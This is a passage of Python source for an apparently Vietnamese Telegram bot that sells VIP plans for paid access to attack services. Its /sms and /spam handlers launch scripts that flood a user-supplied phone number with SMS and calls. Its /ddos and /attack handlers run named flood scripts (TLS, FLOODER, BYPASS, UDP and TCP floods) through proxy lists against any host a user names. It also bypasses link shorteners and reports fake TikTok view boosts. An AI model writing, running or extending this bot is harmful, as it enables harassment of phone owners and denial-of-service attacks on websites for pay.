    last_view_time[message.chat.id] = datetime.datetime.now()  # L∆∞u th·ªùi gian cu·ªëi c√πng ng∆∞·ªùi d√πng s·ª≠ d·ª•ng l·ªánh /viewvip

    today = datetime.datetime.now().strftime('%d-%m-%Y')

    response_message = (
        f'‚û§ UserID : {user_id}\n'
        f'‚û§ URL : {url}\n'
        f'‚û§ S·ªë View : 3000 Views\n'
        f'‚û§ Tr·∫°ng Th√°i : Th√†nh C√¥ng\n'
        f'‚û§ Time : {today}\n'
        f'‚û§ Plan : ùêïùê¢ùê©\n'
        f'‚û§ Owner : @minhduc3919\n'
    )
    bot.send_message(message.chat.id, response_message)








@bot.message_handler(commands=['ytb'])
def search_youtube(message):
    # L·∫•y t·ª´ kh√≥a t√¨m ki·∫øm t·ª´ tin nh·∫Øn
    keyword = message.text.replace("/ytb", "").strip()

    # Ki·ªÉm tra xem ƒë√£ cung c·∫•p t·ª´ kh√≥a t√¨m ki·∫øm ch∆∞a
    if not keyword:
        bot.reply_to(message, "Vui l√≤ng nh·∫≠p t·ª´ kh√≥a t√¨m ki·∫øm!\nV√≠ d·ª•: /ytb Anonymous")
        return

    try:
        # T√¨m ki·∫øm video tr√™n YouTube
        search = VideosSearch(keyword, limit=6)
        results = search.result()
        
        # L·∫•y danh s√°ch li√™n k·∫øt video
        video_links = [f"https://www.youtube.com/watch?v={video['id']}" for video in results['result']]
        
        # G·ª≠i danh s√°ch li√™n k·∫øt v·ªÅ cho ng∆∞·ªùi d√πng
        if video_links:
            bot.reply_to(message, "\n".join(video_links))
        else:
            bot.reply_to(message, f"Kh√¥ng t√¨m th·∫•y video n√†o ph√π h·ª£p v·ªõi t·ª´ kh√≥a '{keyword}'!")
    except Exception as e:
        bot.reply_to(message, f"C√≥ l·ªói x·∫£y ra: {str(e)}")







@bot.message_handler(commands=['vuotlink'])
def vuotlink(message):
    text = message.text
    reply_text = ""
    if "link68.net" in text:
        response = requests.get("https://api.nm2302.site/0.php?web=link68.net")
        password = response.json().get("password")
        reply_text = f"{password}"
    elif "laymangay" in text:
        response = requests.get("https://api.nm2302.site/0.php?web=laymangay.com")
        password = response.json().get("password")
        reply_text = f"{password}"
    elif "traffic123.net" in text:
        response = requests.get("https://api.nm2302.site/0.php?web=traffic123.net")
        password = response.json().get("password")
        reply_text = f"{password}"
    elif "web1s.vip" in text or "link4m.com" in text:
        reply_text = "Khoan ƒê√£ H√¨nh Nh∆∞ B·∫°n ƒê√£ Ch·ªën Ti·∫øt C·ªßa Th·∫ßy Hu·∫•n"
    else:
        reply_text = "C√°c link hi·ªán c√≥ th·ªÉ bypass l√† link68.net | laymangay.net | laymangay.com | traffic123.net | web1s.vip | link4m.com\nC√°ch d√πng :\n/vuotlink [lo·∫°i link]\nEx: /vuotlink link68.net"
    
    bot.reply_to(message, reply_text)




@bot.message_handler(commands=['muaplan'])
def purchase_plan(message):
    user_id = message.from_user.id
    
    # Thay th·∫ø c√°c gi√° tr·ªã sau b·∫±ng th√¥ng tin thanh to√°n c·ªßa b·∫°n
    nganhang_tsr = "THESIEURE.COM"
    ten_nguoi_mua = "doantrungnguyen"
    email_nguoi_mua = "ƒê.T Nguy√™n"
    so_dien_thoai = f"MUAVIP-{user_id}"  # Thay ƒë·ªïi ·ªü ƒë√¢y
    so_dien_thoai2 = f"BOTCON-{user_id}" 
    so_tien = "40.000vnƒë"

    purchase_info = f'''
>> ùóßùóõùó¢ÃÇùó°ùóö ùóßùóúùó° ùóßùóõùóîùó°ùóõ ùóßùó¢ùóîÃÅùó° üí≥

>> ùóßùóµùóÆùóªùóµ ùóßùóºùóÆÃÅùóª ùóöùóºÃÅùó∂ ùó©ùó∂ùóΩ üíµ
- THANH TO√ÅN QUA : {nganhang_tsr}
- Ch·ªß T√†i Kho·∫£n : {ten_nguoi_mua}
- H·ªç T√™n : {email_nguoi_mua}
- N·ªôi Dung : {so_dien_thoai}
- S·ªë Ti·ªÅn : {so_tien}

>> ùóßùóÆÃ£ùóº ùóïùóºùòÅ ùóñùóºùóª ü§ñ
- N·ªôi Dung : {so_dien_thoai2}
- S·ªë Ti·ªÅn : 100.000vnƒë

Li√™n h·ªá ngay v·ªõi t√¥i @minhduc3919 n·∫øu b·∫°n g·∫∑p l·ªói 
D√πng l·ªánh /admin1 ƒë·ªÉ hi·ªÉn th·ªã th√™m th√¥ng tin 
    '''

    bot.reply_to(message, purchase_info)




# Danh s√°ch c√°c qu·ªëc gia c·∫ßn ki·ªÉm tra
COUNTRIES = [
    ("üáªüá≥", "Vietnam"),
    ("üá∫üá∏", "United States"),
    ("üá¨üáß", "United Kingdom"),
    ("üá¶üá∫", "Australia"),
    ("üá©üá™", "Germany"),
    ("üá´üá∑", "France"),
    ("üá®üá¶", "Canada"),
    ("üáØüáµ", "Japan"),
    ("üá∑üá∫", "Russia"),
    ("üáÆüá≥", "India"),
    ("üáßüá∑", "Brazil")
    # Th√™m c√°c qu·ªëc gia kh√°c v√†o ƒë√¢y n·∫øu c·∫ßn
]

# H√†m ƒë·ªÉ x√≥a tin nh·∫Øn "Wait 5s for checking" sau 5 gi√¢y
def delete_wait_message(chat_id, message_id):
    time.sleep(5)
    bot.delete_message(chat_id, message_id)

@bot.message_handler(commands=['http'])
def check_http(message):
    try:
        # Ki·ªÉm tra xem tin nh·∫Øn c√≥ ch·ª©a vƒÉn b·∫£n kh√¥ng
        if len(message.text.split()) > 1:
            # L·∫•y ƒë·ªãa ch·ªâ trang web t·ª´ tin nh·∫Øn c·ªßa ng∆∞·ªùi d√πng
            url = message.text.split()[1]

            # G·ª≠i tin nh·∫Øn "Wait 5s for checking"
            wait_message = bot.reply_to(message, "Wait 5s for checking üîé")

            # T·∫°o m·ªôt lu·ªìng th·ª±c thi ƒë·ªÉ x√≥a tin nh·∫Øn "Wait 5s for checking" sau 5 gi√¢y
            threading.Thread(target=delete_wait_message, args=(wait_message.chat.id, wait_message.message_id)).start()

            # Kh·ªüi t·∫°o danh s√°ch k·∫øt qu·∫£
            results = []

            # G·ª≠i y√™u c·∫ßu HTTP GET v√† ki·ªÉm tra tr·∫°ng th√°i t·ª´ng qu·ªëc gia
            for flag, country in COUNTRIES:
                try:
                    response = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                    status_code = response.status_code
                    reason = response.reason
                    response_time = response.elapsed.total_seconds()
                    result = f"Country: {flag} | {status_code} ({reason}) | {response_time:.2f}s"
                except requests.exceptions.RequestException as e:
                    result = f"Country: {flag} | Error: {e}"
                results.append(result)

            # T·∫°o tin nh·∫Øn ph·∫£n h·ªìi
            response_text = "\n".join(results)
            bot.reply_to(message, response_text)
        else:
            bot.reply_to(message, "Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p. V√≠ d·ª•: /http http://example.com")
    except Exception as e:
        # N·∫øu c√≥ l·ªói x·∫£y ra, ph·∫£n h·ªìi v·ªõi m√£ tr·∫°ng th√°i 503 v√† l√Ω do
        error_response = "\n".join([f"Country: {flag} | Error: {e}" for flag, _ in COUNTRIES])
        bot.reply_to(message, error_response)






# ƒê·ªãnh nghƒ©a t·ª´ ƒëi·ªÉn languages v·ªõi c√°c ng√¥n ng·ªØ v√† m√£ hi·ªÉn th·ªã t∆∞∆°ng ·ª©ng
languages = {
    'vi-beta': 'Ti·∫øng Vi·ªát üáªüá≥',
    'en-beta': 'English üá∫üá∏'
}

# Thi·∫øt l·∫≠p ng√¥n ng·ªØ m·∫∑c ƒë·ªãnh
current_language = 'en-beta'

# C·∫≠p nh·∫≠t m√£ x·ª≠ l√Ω cho l·ªánh /language
@bot.message_handler(commands=['language'])
def switch_language(message):
    global current_language
    
    # Ki·ªÉm tra xem c√≥ tham s·ªë ng√¥n ng·ªØ ƒë∆∞·ª£c cung c·∫•p kh√¥ng
    if len(message.text.split()) > 1:
        # L·∫•y ng√¥n ng·ªØ t·ª´ tham s·ªë d√≤ng l·ªánh
        new_language = message.text.split()[1].lower()
        if new_language in languages:  # Ki·ªÉm tra ng√¥n ng·ªØ c√≥ h·ª£p l·ªá kh√¥ng
            # L∆∞u ng√¥n ng·ªØ m·ªõi
            current_language = new_language
            # T·∫°o link t∆∞∆°ng ·ª©ng v·ªõi ng√¥n ng·ªØ m·ªõi
            link = f"https://t.me/setlanguage/{new_language}"
            # Ph·∫£n h·ªìi cho ng∆∞·ªùi d√πng v·ªÅ vi·ªác thay ƒë·ªïi ng√¥n ng·ªØ v√† li√™n k·∫øt t∆∞∆°ng ·ª©ng
            bot.reply_to(message, f">> ƒê·ªÉ Chuy·ªÉn Sang Ng√¥n Ng·ªØ {languages[new_language]} !\nVui l√≤ng s·ª≠ d·ª•ng li√™n k·∫øt sau ƒë·ªÉ thay ƒë·ªïi ng√¥n ng·ªØ: {link}")
        else:
            # N·∫øu ng√¥n ng·ªØ kh√¥ng h·ª£p l·ªá, th√¥ng b√°o cho ng∆∞·ªùi d√πng
            bot.reply_to(message, ">>Ng√¥n ng·ªØ kh√¥ng h·ª£p l·ªá !\nVui l√≤ng ch·ªçn 'vi-beta' cho Ti·∫øng Vi·ªát üáªüá≥ ho·∫∑c 'en' cho English üá∫üá∏")
    else:
        # N·∫øu kh√¥ng c√≥ tham s·ªë ng√¥n ng·ªØ, th√¥ng b√°o cho ng∆∞·ªùi d√πng
        bot.reply_to(message, ">> Nh·∫≠p ng√¥n ng·ªØ b·∫°n mu·ªën chuy·ªÉn ƒë·ªïi !\n>> [ vi-beta üáªüá≥ ho·∫∑c en-beta üá∫üá∏ ]\nVD: /language vi-beta")




@bot.message_handler(commands=['cachdung', 'lenh'])
def lenh(message):
    help_text = '''
ùó†ùó≤ùóªùòÇ ùóôùòÇùóπùóπ ùóñùóºùó∫ùó∫ùóÆùóªùó± ‚òîÔ∏è
‚Ä¢ /getkey [Get Key ] üí≤
‚Ä¢ /key     [D√πng Key] üí≤
‚Ä¢ /muaplan [Mua Vipüí≥] üí≤
‚Ä¢ /profile [Check Plan] üí≤
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚Ä¢ /ddos [ Show Methods Layer 7 ]
‚Ä¢ /spam [SƒêT] Spam SMS + CALL  
‚Ä¢ /sms [SƒêT] Spam SMS 
‚Ä¢ /viewvip [URL] View Tiktok Vip
‚Ä¢ /view [URL] Buff View Tiktok
‚Ä¢ /fb [Link FB] Check Info Facebook
‚Ä¢ /vuotlink [URL] V∆∞·ª£t link r√∫t g·ªçn 1s 
‚Ä¢ /tt [City] Check Th·ªùi Ti·∫øt
‚Ä¢ /avtfb [Link FB] Get AVTFB Xuy√™n Khi√™n
‚Ä¢ /ytb [T·ª´ Kh√≥a] T√¨m Ki·∫øm Video Youtube
‚Ä¢ /http [URL] Check Live Website
‚Ä¢ /check [T√™n Mi·ªÅn] Check IP Website
‚Ä¢ /getproxy [ Get Free Proxy ]
‚Ä¢ /code [ URL ] L·∫•y M√£ Ngu·ªìn Website
‚Ä¢ /kiemtra [Domain] Check Domain 
‚Ä¢ /id [L·∫•y ID Telegram]
‚Ä¢ /language [vi-en] ƒê·ªïi Ng√¥n Ng·ªØ üáªüá≥-üá∫üá∏
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚Ä¢ /admin1 [Owner] üì©
‚Ä¢ /admin2 [Admin] üì©
‚Ä¢ /donate [ T·∫∑ng Admin G√≥i M√¨ ]
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
# Danh s√°ch s·ªë ƒëi·ªán tho·∫°i c·∫•m spam
banned_numbers = ["0942353163", "0879239401", "0559140928"]
last_sms_time = 0

@bot.message_handler(commands=['sms'])
def spam(message):
    global last_sms_time
    
    # Ki·ªÉm tra n·∫øu cu·ªôc tr√≤ chuy·ªán kh√¥ng ph·∫£i l√† lo·∫°i "group" ho·∫∑c "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin L·ªói T√¥i Ch·ªâ Ho·∫°t ƒê·ªông Tr√™n Nh√≥m : https://t.me/botvipfc')
        return

    user_id = message.from_user.id
    
    # Ki·ªÉm tra th·ªùi gian gi·ªØa hai l·∫ßn s·ª≠ d·ª•ng l·ªánh /sms
    current_time = time.time()
    if current_time - last_sms_time < 31:
        remaining_time = int(31 - (current_time - last_sms_time))
        bot.reply_to(message, f'Vui l√≤ng ch·ªù {remaining_time} gi√¢y tr∆∞·ªõc khi s·ª≠ d·ª•ng l·∫°i l·ªánh /sms.')
        return
    
    if len(message.text.split()) != 3:
        bot.reply_to(message, 'Vui l√≤ng nh·∫≠p ƒë√∫ng ƒë·ªãnh d·∫°ng | V√≠ d·ª•: /sms 0987654321 10')
        return
    
    phone_number = message.text.split()[1]
    lap = message.text.split()[2]
    
    if not lap.isnumeric() or not (0 < int(lap) <= 10):
        bot.reply_to(message, 'S·ªë l·∫ßn spam kh√¥ng h·ª£p l·ªá. Vui l√≤ng spam trong kho·∫£ng t·ª´ 1 ƒë·∫øn 10 l·∫ßn !')
        return
    
    if phone_number in banned_numbers:
        bot.reply_to(message, 'Kh√¥ng th·ªÉ Spam S·ªë C·ªßa Admin ƒê·∫πp Trai ku To 20CM Khi·∫øn C√°c Ch·ªã Em Bantumlumm !')
        return
    
    if len(phone_number) != 10 or not phone_number.isdigit():
        bot.reply_to(message, 'S·ªë ƒëi·ªán tho·∫°i kh√¥ng h·ª£p l·ªá!')
        return
    
    # Th·ª±c hi·ªán spam s·ªë ƒëi·ªán tho·∫°i

    file_path = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, "10"])
    processes.append(process)
    bot.reply_to(message, f'''
    ‚û§ User ID üë§: [ {user_id} ]
‚û§ Spam: [ {phone_number} ] Success üì±
‚û§ L·∫∑p L·∫°i ‚öîÔ∏è : {lap} üï∞
‚û§ Ng√†y : {TimeStamp()}
‚û§ Plan : FREE
‚û§ Ch√∫c B·∫°n s·ª≠ d·ª•ng bot vui v·∫ª‚ö°Ô∏è
    ''')
    
    # C·∫≠p nh·∫≠t th·ªùi gian s·ª≠ d·ª•ng l·ªánh /sms l·∫ßn cu·ªëi
    last_sms_time = current_time




last_spam_time = 0  # Th√™m bi·∫øn last_spam_time ƒë·ªÉ l∆∞u th·ªùi gian s·ª≠ d·ª•ng l·ªánh /spam l·∫ßn cu·ªëi

@bot.message_handler(commands=['spam'])
def spam(message):
    global last_spam_time

    # Ki·ªÉm tra xem ng∆∞·ªùi g·ª≠i c√≥ ph·∫£i l√† admin ho·∫∑c th√†nh vi√™n VIP kh√¥ng
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS and member_types.get(user_id) != 'VIP':
        bot.reply_to(message, '‚ö†Ô∏è G√≥i Vip c·ªßa b·∫°n kh√¥ng t·ªìn t·∫°i ho·∫∑c ƒë√£ h·∫øt h·∫°n\nVui l√≤ng li√™n h·ªá @minhduc3919 ƒë·ªÉ mua g√≥i VIP\nS·ª≠ d·ª•ng /profile ƒë·ªÉ ki·ªÉm tra Plan\nD√πng L·ªánh /muaplan ƒê·ªÉ Xem Gi√°\n\nüö´ S·ª≠ d·ª•ng l·ªánh /sms n·∫øu b·∫°n l√† ng∆∞·ªùi d√πng mi·ªÖn ph√≠')
        return
    
    # Ki·ªÉm tra n·∫øu cu·ªôc tr√≤ chuy·ªán kh√¥ng ph·∫£i l√† lo·∫°i "group" ho·∫∑c "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin L·ªói T√¥i Ch·ªâ Ho·∫°t ƒê·ªông Tr√™n Nh√≥m : https://t.me/botvipfc')
        return
    
    # Ki·ªÉm tra th·ªùi gian gi·ªØa hai l·∫ßn s·ª≠ d·ª•ng l·ªánh /spam
    current_time = time.time()
    if current_time - last_spam_time < 160:
        remaining_time = int(160 - (current_time - last_spam_time))
        bot.reply_to(message, f'Vui l√≤ng ch·ªù {remaining_time} gi√¢y tr∆∞·ªõc khi s·ª≠ d·ª•ng l·∫°i l·ªánh /spam')
        return
    
    if len(message.text.split()) != 3:
        bot.reply_to(message, 'Vui l√≤ng nh·∫≠p ƒë√∫ng ƒë·ªãnh d·∫°ng | V√≠ d·ª•: /spam 0987654321 30')
        return
    
    phone_number = message.text.split()[1]
    lap = message.text.split()[2]
    
    if not lap.isnumeric() or not (0 < int(lap) <= 30):
        bot.reply_to(message, 'S·ªë l·∫ßn spam kh√¥ng h·ª£p l·ªá. Vui l√≤ng spam trong kho·∫£ng t·ª´ 1 ƒë·∫øn 30 l·∫ßn ')
        return
    
    if phone_number in banned_numbers:
        bot.reply_to(message, 'Kh√¥ng th·ªÉ Spam S·ªë C·ªßa Admin ƒê·∫πp Trai ku To 20CM Khi·∫øn C√°c Ch·ªã Em Bantumlumm!')
        return
    
    if len(phone_number) != 10 or not phone_number.isdigit():
        bot.reply_to(message, 'S·ªë ƒëi·ªán tho·∫°i kh√¥ng h·ª£p l·ªá!')
        return
    # Th·ª±c hi·ªán spam s·ªë ƒëi·ªán tho·∫°i

    file_path = os.path.join(os.getcwd(), "smsvip.py")
    process = subprocess.Popen(["python", file_path, phone_number, "35"])
    processes.append(process)
    bot.reply_to(message, f'''
    ‚û§ User ID üë§: [ {user_id} ]
‚û§ Spam: [ {phone_number} ] Success üì±
‚û§ L·∫∑p L·∫°i ‚öîÔ∏è : {lap} üï∞
‚û§ Ng√†y : {TimeStamp()}
‚û§ Plan : VIP
‚û§ Ch√∫c B·∫°n s·ª≠ d·ª•ng bot vui v·∫ª‚ö°Ô∏è
    ''')
    
    # C·∫≠p nh·∫≠t th·ªùi gian s·ª≠ d·ª•ng l·ªánh /spam l·∫ßn cu·ªëi
    last_spam_time = current_time

    


@bot.message_handler(commands=['avtfb'])
def get_facebook_avatar(message):
    # Ki·ªÉm tra ƒë·ªãnh d·∫°ng c·ªßa l·ªánh
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui l√≤ng nh·∫≠p ƒë√∫ng ƒë·ªãnh d·∫°ng\nExample: /avtfb [link ho·∫∑c id]')
        return
    
    # L·∫•y ƒë·ªëi s·ªë t·ª´ tin nh·∫Øn
    parameter = message.text.split()[1]

    # X√°c ƒë·ªãnh xem c√≥ ph·∫£i l√† ID Facebook hay l√† li√™n k·∫øt Facebook
    if parameter.isdigit():  # N·∫øu l√† ID Facebook
        facebook_url = f'https://www.facebook.com/{parameter}'
    else:  # N·∫øu l√† li√™n k·∫øt Facebook
        facebook_url = parameter

    # Ki·ªÉm tra xem li√™n k·∫øt c√≥ ph·∫£i t·ª´ Facebook kh√¥ng
    if 'facebook.com' not in facebook_url:
        bot.reply_to(message, 'Li√™n k·∫øt kh√¥ng ph·∫£i t·ª´ Facebook')
        return

    try:
        # G·ª≠i y√™u c·∫ßu GET ƒë·∫øn trang Facebook
        response = requests.get(facebook_url)
        response.raise_for_status()

        # S·ª≠ d·ª•ng BeautifulSoup ƒë·ªÉ ph√¢n t√≠ch n·ªôi dung HTML
        soup = BeautifulSoup(response.text, 'html.parser')

        # T√¨m th·∫ª meta ch·ª©a URL ·∫£nh ƒë·∫°i di·ªán
        meta_image = soup.find('meta', property='og:image')

        # Ki·ªÉm tra xem c√≥ ph·∫£i l√† li√™n k·∫øt ·∫£nh kh√¥ng
        if meta_image:
            avatar_url = meta_image['content']
            # G·ª≠i ·∫£nh v·ªÅ cho ng∆∞·ªùi d√πng
            bot.send_photo(message.chat.id, avatar_url)
        else:
            bot.reply_to(message, 'Xin l·ªói, kh√¥ng t√¨m th·∫•y ·∫£nh ƒë·∫°i di·ªán c·ªßa ng∆∞·ªùi d√πng.')
    except Exception as e:
        bot.reply_to(message, 'Xin l·ªói, kh√¥ng th·ªÉ l·∫•y ƒë∆∞·ª£c ·∫£nh ƒë·∫°i di·ªán c·ªßa ng∆∞·ªùi d√πng. Vui l√≤ng th·ª≠ l·∫°i sau.')







@bot.message_handler(commands=['ddos'])
def ddos(message):
    # Li√™n k·∫øt video
    video_link = 'https://files.catbox.moe/sfo6lq.mp4'

    # HTML nh√∫ng video t·ª´ li√™n k·∫øt
    video_html = f'<a href="{video_link}">&#8205;</a>'

    # Tin nh·∫Øn h∆∞·ªõng d·∫´n
    help_text = '''  
>> ùóôùòÇùóπùóπ ùó†ùó≤ùòÅùóµùóºùó±ùòÄ ùóüùóÆùòÜùó≤ùóøùü≥ ‚ö°Ô∏è
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
 ‚Ä¢ ùóüùóÆùòÜùó≤ùóøùü≥ ùóôùóøùó≤ùó≤
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
 ‚Ä¢ BOTLAG [ Free ] 
 ‚Ä¢ HTTPS [ Free ] 
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
 ‚Ä¢ ùóüùóÆùòÜùó≤ùóøùü≥ ùó©ùó∂ùóΩ
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
 ‚Ä¢ DESTROY [ Vip ]  
 ‚Ä¢ TLS [ Vip ] 
 ‚Ä¢ SMURF [ Vip ] 
 ‚Ä¢ BYPASS [ Vip ] 
 ‚Ä¢ FLOODER [ Vip ] 
 ‚Ä¢ GOD [ Vip ] 
 ‚Ä¢ MIX [ Vip ] 
 ‚Ä¢ UAM [ Vip ] 
 ‚Ä¢ MARS [ Vip ] 
 ‚Ä¢ TCP [ Vip ] 
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
'''

    # G·ª≠i tin nh·∫Øn v·ªõi video v√† tin nh·∫Øn h∆∞·ªõng d·∫´n
    bot.send_message(message.chat.id, help_text)
    bot.send_message(message.chat.id, video_html, parse_mode='HTML')



allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "ƒê√£ D·ª´ng L·ªánh T·∫•n C√¥ng, C·∫£m ∆†n B·∫°n ƒê√£ S·ª≠ D·ª•ng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def perform_attack(message):
    # Ki·ªÉm tra n·∫øu cu·ªôc tr√≤ chuy·ªán kh√¥ng ph·∫£i l√† lo·∫°i "group" ho·∫∑c "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin L·ªói T√¥i Ch·ªâ Ho·∫°t ƒê·ªông Tr√™n Nh√≥m : https://t.me/botvipfc')
        return
    
    user_id = message.from_user.id

    # Ki·ªÉm tra xem user_id c√≥ ph·∫£i l√† admin hay kh√¥ng
    if user_id not in ADMIN_IDS:
        # N·∫øu kh√¥ng ph·∫£i l√† admin, ki·ªÉm tra xem user_id c√≥ trong danh s√°ch allowed_users kh√¥ng
        if user_id not in allowed_users:
            bot.reply_to(message, text='Vui l√≤ng nh·∫≠p Key\nS·ª≠ d·ª•ng l·ªánh /getkey ƒë·ªÉ l·∫•y Key')
            return

    # Ph·∫ßn c√≤n l·∫°i c·ªßa x·ª≠ l√Ω l·ªánh /attack ·ªü ƒë√¢y...

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui l√≤ng S·ª≠ D·ª•ng ƒê√∫ng L·ªánh\nV√≠ d·ª•: /attack + [Method] + [Host] + [Port]\nEx: /attack HTTPS https://example.com/ 443')
        return

    username = message.from_user.username
    
    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 300:
        remaining_time = int(300 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui l√≤ng ƒë·ª£i {remaining_time} gi√¢y tr∆∞·ªõc khi s·ª≠ d·ª•ng l·∫°i l·ªánh /attack")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui l√≤ng Nh·∫≠p C·∫£ Port.\nV√≠ d·ª•: /attack {method} {host} [Port]')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "liem.com"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'BYPASS' or method == 'SMURF' or method == 'BYPASS' or method == 'FLOODER' or method == 'GOD' or method == 'HTTPS' or method == 'MIX' or method == 'UAM' or method == 'MARS' or method == 'TCP':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Kh√¥ng ƒë∆∞·ª£c ph√©p t·∫•n c√¥ng trang web c√≥ t√™n mi·ªÅn {blocked_domain}")
                return

    # Th√™m c√°c ph∆∞∆°ng th·ª©c ddos ch·ªâ cho ph√©p VIP ·ªü ƒë√¢y
    vip_methods = ['DESTROY', 'TLS', 'SMURF', 'BYPASS', 'FLOODER', 'GOD', 'MIX', 'UAM', 'MARS', 'TCP']
    free_methods = ['HTTPS', 'BOTLAG']
    if method not in vip_methods and method not in free_methods:
        bot.reply_to(message, '>> Th√†nh vi√™n VIPüí≥ m·ªõi c√≥ th·ªÉ s·ª≠ d·ª•ng l·ªánh n√†y !\n>> Mua Vipüí≥ ·ªü /muaplan')
        return

    # C√°c l·ªánh ddos c√≤n l·∫°i ·ªü ƒë√¢y...

    # Ph·∫ßn x√°c ƒë·ªãnh gi√° cho ph∆∞∆°ng th·ª©c t·∫•n c√¥ng
    price = "VIP" if method in vip_methods else "Free"

    if method in ['TLS', 'GOD', 'MIX', 'BOTLAG', 'DESTROY', 'TCP' , 'FLOODER', 'HTTPS' , 'UAM', 'BYPASS', 'SMURF', 'UDP-FLOOD', 'TCP-FLOOD','MARS','BR','TLS-FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS.js", host, "90", "45", "13" , "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        if method == 'FLOODER':
            command = ["node", "FLOODER.js", host, "90", "41", "12" , "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        if method == 'UAM':
            command = ["node", "UAM.js", host, "10", "90", "proxy.txt"]
            duration = 90  if price == "VIP" else 90  
        if method == 'HTTPS':
            command = ["node", "HTTPS.js", host, "45", "40", "16" , "proxy.txt"]
            duration = 60 if price == "Free" else 120  
        elif method == 'SMURF':
            command = ["node", "SMURF.js", host, "90", "40", "35" , "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'TCP':
            command = ["node", "TCP.js", host, "90", "55", "7" , "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'MIX':
            command = ["node", "MIX.js", host, "90", "40", "12" , "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'BOTLAG':
            command = ["node", "BOTLAG.js", host, "45", "65", "25" , "proxy.txt"]
            duration = 60 if price == "Free" else 120  
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "90", "43", "12" , "proxy.txt" ]
            duration = 90 if price == "VIP" else 90  
        elif method == 'DESTROY':
            command = ["node", "DESTROY.js", host,
                       "90", "60", "15", "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'BYPASS':
            command = ["node", "BYPASS.js", host,
                        "90", "42", "13", "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'MARS':
            command = ["node", "MARS.js", host,
                      "90", "41", "12", "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port ph·∫£i l√† m·ªôt s·ªë nguy√™n d∆∞∆°ng.')
                return
            command = ["python", "udp.py", host, port, "90", "64", "10"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port ph·∫£i l√† m·ªôt s·ªë nguy√™n d∆∞∆°ng.')
                return
            command = ["python", "tcp.py", host, port, "90", "64", "10"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'BR':
            command = ["node", "BR.js", host, "90", "50", "proxy.txt", "128", "90"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'TLS-FLOOD':
            command = ["node", "TLS-FLOOD.js", host, "90", "120", "50", "proxy.txt"]
            duration = 90 if price == "VIP" else 90  

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(
            target=run_attack, args=(command, duration, message))
        attack_thread.start()
        video_url = "https://files.catbox.moe/osixt0.mp4"  # Replace this with the actual video URL      
